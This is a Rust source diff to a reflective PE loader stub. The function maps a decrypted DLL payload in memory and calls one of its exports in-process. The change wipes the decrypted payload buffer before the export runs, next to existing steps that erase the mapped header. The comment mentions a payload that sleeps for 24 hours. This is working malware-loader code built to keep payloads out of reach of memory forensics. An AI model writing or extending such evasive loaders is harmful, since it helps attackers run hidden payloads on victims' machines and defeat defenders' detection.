@@ -96,11 +96,13 @@ impl BaseRelocationEntry {
 /// named export is how a DLL payload does real work.
 ///
 /// # Safety
-/// `payload` must point to a valid, readable x64 PE image for the whole call.
-/// The payload is executed in-process, so its code runs with the stub's
-/// privileges.
+/// `payload` must hold a valid, readable PE image for the stub's architecture.
+/// The loader reads it until it has mapped the image and resolved the export;
+/// on the export path it zeroes the buffer before calling the export, which
+/// runs from the mapped copy. The payload is executed in-process, so its code
+/// runs with the stub's privileges.
 pub unsafe fn run_reflective(
-    payload: &[u8],
+    payload: &mut [u8],
     export: Option<&str>,
 ) -> Result<i32, String> {
     let (_dos, nt) = get_headers(payload)?;
@@ -162,6 +164,14 @@ pub unsafe fn run_reflective(
             call_dll_main(image_base, nt);
         }
         let address = resolve_export(image_base, nt, name)?;
+        // Last read of the buffer: `resolve_export` returns `base + rva`, an
+        // address inside the mapped image, not a pointer into `payload`. The
+        // loader does not own the buffer, so it cannot free it, and the export
+        // may block for hours (Xenon's `DllRegisterServer` sleeps 24h): zeroing
+        // drops the pristine decrypted DLL without keeping it alive for that
+        // lifetime. This must stay after every step that reads `nt`: the TLS
+        // callbacks, `DllMain`, `erase_mapped_header` and `resolve_export`.
+        payload.fill(0);
         crate::tech_dbg!("reflective_loading", "calling export '{name}' at 0x{address:x}");
         let _handoff = crate::tls_handoff::PauseGuard::enter();
         call_export(address);
